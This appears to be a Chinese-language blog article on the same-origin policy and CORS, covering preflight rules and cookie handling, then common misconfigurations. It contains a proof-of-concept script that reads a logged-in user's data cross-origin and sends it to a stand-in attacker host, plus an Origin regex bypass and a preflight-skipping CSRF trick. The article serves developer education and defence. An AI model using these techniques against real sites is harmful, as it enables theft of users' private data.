一、同源策略

   首先为什么要跨域？谈到跨域就不得不提浏览器的同源策略（Same Origin Policy,SOP）, 同源策略会阻止一个域的javascript脚本和另外一个域进行交互,从而保证了不同域之间的内容和脚本是隔离的，保证安全性。同源要求两个页面具有相同的协议、域名、端口号,否则就为不同源。因此如果A网站(http://a.com)想访问B网站(http://b.com)里面的某个接口或者读取返回的内容做进一步的处理，就需要考虑跨域问题了，一般情况下浏览器会阻止不安全的跨域行为，例如下图展示了火狐浏览器阻止的跨域请求。

但是我们知道html中，有些标签是具备天然的跨域功能的，比如<script>、<img>、<iframe>等标签的src 属性可以直接跨域请求其它域的资源和js脚本。例如A网站html是这样的,但是js脚本引入了b网站的content.js：

<script src="http://b.com/js/content.js">

那问题就来了，a.com 和加载的content.js是同源还是不同源？其实是同源的。因为虽然a.com加载了b.com下的content.js，但是content.js是运行在a.com页面中的，因此对于打开的页面（a.com）来说，content.js的Origin就应该是a.com而不是b.com。但浏览器为了安全起见，浏览器是不允许这种方式下网站的其它脚本对加载的资源（content.js）进行读写操作。

二、跨域方法

（1）XMLHttpRequest

   在AJAX应用开发中，我们常用XMLHttpRequest 方式去发起跨域请求，我们常说的跨域资源共享(CORS) 是一种机制，它使用额外的 HTTP 头来告诉浏览器让运行在一个 origin (domain) 上的Web应用被准许访问来自不同源服务器上的指定的资源。当一个资源从与该资源本身所在的服务器不同的域、协议或端口请求一个资源时，资源会发起一个跨域 HTTP 请求。但是浏览器决定是否阻断此次请求是要看被跨域请求的网站（b.com）的返回头header中是否包含“授权访问标头”—Access-Control-Allow。

假如站点 http://foo.example 的网页应用想要访问 http://bar.other 的资源。http://foo.example 的网页中可能包含类似于下面的 JavaScript 代码：

<script>function jsonreq() {var xmlhttp = new XMLHttpRequest();//xmlhttp.withCredentials = true;//用做对比，后续说明xmlhttp.open("POST","http://bar.other/doc", true);xmlhttp.setRequestHeader("Content-Type","text/plain");xmlhttp.send("{json_xxx}");xmlhttp.onreadystatechange = function(){ dosomething();}jsonreq();</script>

（图片来自火狐）

响应中响应首部字段 Access-Control-Allow-Origin: * 表明，该资源可以被任意外域访问。如果服务端仅允许来自 http://foo.example 的访问，该首部字段的内容如下：
Access-Control-Allow-Origin: http://foo.example
当然这次请求会成功，但是当我们把上面的代码片段中:
xmlhttp.setRequestHeader("Content-Type","text/plain");改为xmlhttp.setRequestHeader("Content-Type","application/json");
我们会发现浏览器会多一步操作就是先发送一个 OPTIONS方法请求，通常也称为预请求，火狐浏览器规定是以下情况的请求需要先进行“预检”，也称为预检请求(preflight)。
当请求满足下述任一条件时，即应首先发送预检请求：
  • 使用了下面任一 HTTP 方法：
    • PUT
    • DELETE
    • CONNECT
    • OPTIONS
    • TRACE
    • PATCH
  • 人为设置了对 CORS 安全的首部字段集合之外的其他首部字段。该集合为：
    • Accept
    • Accept-Language
    • Content-Language
    • Content-Type (需要注意额外的限制)
    • DPR
    • Downlink
    • Save-Data
    • Viewport-Width
    • Width
  •  Content-Type 的值不属于下列之一:
    • application/x-www-form-urlencoded
    • multipart/form-data
    • text/plain
  • 请求中的XMLHttpRequestUpload 对象注册了任意多个事件监听器。
  • 请求中使用了ReadableStream对象。
因此我们上面请求的Content-Type是application/json不在“免预检”范围内，因此浏览器会先发一个 OPTIONS.

需要注意的是：如果需要跨域请求带上Cookie，则需要响应中响应首部字段
Access-Control-Allow-Credentials: true
，否则浏览器将不会携带http://bar.other 域下的cookie发起一个CORS请求。与此同时，如果设置：
Access-Control-Allow-Origin: *
，则浏览器不会允许请求携带cookie信息，也就是在前端发起xmlhttprequest请求中设置
xmlhttp.withCredentials = true;//让浏览器携带cookie
 会被浏览器阻止，表明无法在 Access-Control-Allow-Origin: * 的情况下携带cookie信息（指的是被跨域访问的网站的cookie）进行CORS，浏览器会直接阻断此次请求。如果想在这种情况下跨域，则必须要删除xmlhttp.withCredentials=true;这段代码，即只能发起不携带cookie信息的跨域请求，这点开发人员在开发中需要多加留意下。
上面说到如果简单请求，那如果没有Access-Control-Allow-Credentials: true，浏览器会携带cookie 发送请求吗？答案是肯定的。这是因为简单 GET 请求，浏览器则不会对其发起“预检请求”，只是浏览器将不会把响应内容返回给发送者。因此如果是简单请求的csrf 写操作则完全可以无视这个限制。
下面介绍下CORS中开发误配置所导致的安全问题：假如某网站A,B,C与某网站B的某个接口(数据传输使用json)存在跨域资源共享，如果网站B后台对Access-Control-Allow-Origin采用正则的方式，若正则编写失误的话很可能产生安全漏洞，亦或者后台不校验“Content-Type"的话，也可以和CSRF结合从而产生安全漏洞。
<html><script>function jsonreq() {var xmlhttp = new XMLHttpRequest();xmlhttp.withCredentials = true;xmlhttp.open("GET","http://b.com/getuserinfo", true);xmlhttp.setRequestHeader("Content-Type","text/plain");//注意这里xmlhttp.send(null);xhr.onreadystatechange = function(){ var res= xhr.responseText; // 读取返回的内容 location='http://evail.com?param='+res; }jsonreq();</script></html>
CORS安全开发过程中可能出现哪些安全问题呢？
1、Access-Control-Allow-Origin误配置获取敏感数据
一般有些应用确实不允许跨域，但若web中间件（例如nginx）上被误配置（尤其和其它应用使用同一个nginx做反向代理【add_header'Access-Control-Allow-Origin' $origin;】）就会造成本级应用被强制允许跨域。笔者就遇到了这样配置的运维大哥。


2、应用只允许一级域名下跨域，但编写正则可绕过。
采用正则匹配白名单域名的方式，若正则编写不准确则可绕过校验进行跨域获取数据。
例如通过 Origin:https://b.com.evil.com 绕过某些匹配到b.com的正则表达式
3、绕过预检请求的写操作CSRF
假如应用A与应用B的某个接口之间(数据传输原本使用json格式)存在跨域资源共享，但应用B未校验Content-Type，因此可通过XMLHttpRequest设置Content-Type为"text/plain"绕过预检请求，携带cookie发送请求报文到B的服务端。（若浏览器发现B返回的报文头没有Access-Control-Allow-Origin和Access-Control-Allow-Credentials: true字段，只是不允许读取返回的数据，但是已经把数据提交了，并不需要读）
